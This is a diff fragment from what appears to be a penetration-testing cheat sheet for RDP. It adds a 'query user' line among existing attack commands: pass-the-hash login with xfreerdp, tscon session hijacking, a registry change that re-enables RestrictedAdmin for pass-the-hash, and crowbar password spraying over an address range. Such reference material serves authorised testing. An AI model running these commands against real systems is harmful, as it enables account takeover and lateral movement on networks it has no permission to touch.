@@ -467,6 +467,7 @@ $ xfreerdp /v:<IP address>  /u:Administrator /pth:<hash>
 $ freerdp /v:<IP address> /cert:ignore /u:Administrator /p:'<password>'
 $ rdesktop -u <username> -p <password> <IP address>
 $ rdp-sec-check.pl <IP address>
+$ query user
 $ tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
 $ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 $ crowbar -b rdp -s <IP address CIDR> -U <usernames.txt> -c '<password>'
